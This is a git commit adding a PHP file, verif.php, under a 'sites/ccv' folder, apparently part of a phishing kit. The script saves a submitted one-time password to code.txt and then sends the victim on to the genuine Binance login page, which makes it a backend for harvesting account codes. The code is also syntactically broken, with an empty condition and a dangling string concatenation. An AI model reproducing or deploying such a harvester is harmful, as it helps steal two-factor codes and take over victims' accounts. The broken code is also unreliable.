c82b71ceb78baf131d7f4f1c67141e16273a3863
anawa3Er <ayoubba3a9li@gmail.com>
2025-03-10 05:04:18 +0100

    Create verif.php

---
+++ sites/ccv/verif.php
@@ -0,0 +1,22 @@
+
+<?php
+// Check if all required fields are submitted
+if (
+    isset($_POST['otp']) &&
+    
+) {
+    $file = "code.txt";
+    $data = 
+        "otp: " . $_POST['otp'] . "\n" .
+;
+
+    file_put_contents($file, $data, FILE_APPEND);
+    header('Location: https://accounts.binance.com/'); // Replace with your URL
+    exit;
+} else {
+    // Log missing fields
+    file_put_contents("error.log", "Missing form data: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
+    header('Location: error_page.html'); // Redirect to error page
+    exit;
+}
+?>
